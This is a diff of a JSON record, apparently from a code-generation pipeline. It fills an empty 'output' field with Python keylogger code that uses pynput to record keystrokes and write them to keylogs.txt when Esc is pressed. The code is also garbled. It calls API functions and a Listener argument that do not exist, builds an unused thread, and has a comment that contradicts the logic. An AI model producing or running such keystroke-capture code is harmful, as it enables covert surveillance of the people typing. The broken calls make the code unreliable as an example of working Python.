@@ -1,6 +1,6 @@
 {
-  "output": "",
-  "notes": "{'ERROR: Generator JSON error'}",
+  "output": "import pynput\nfrom pynput.keyboard import Listener, KeyCode\nfrom threading import Thread\nimport os\n\nlst = []\ndef on_press(key):\n    # Convert key to ASCII\n    if isinstance(key, str):\n        lst.append(key)\n    else:\n        key = getattr(key, 'char', None) or getattr(key, 'name', None)\n        if key =='esc':\n            stop_listening() # stops listening after enter is released on the keyboard\n            for i in lst:\n                with open('keylogs.txt','a') as file:\n                    file.write(i)\n        else :\n            lst.append(\"[\"+key+\"]\")\n\ndef stop_listening():\n    # stops listener\n    global listener\n    listener.stop()\n\non_press_thread = Thread(target=on_press)\nrun_event = KeyCode.from_symbol('enter')\npause_event = KeyCode.from_symbol('esc')\nwith Listener(on_press=on_press, keycode_compare=lambda k:k not in (run_event,pause_event)) as listener:\n    listener.join()",
+  "notes": "generated code and function definitions",
   "applied_fixes": [],
   "iterations": 1
 }
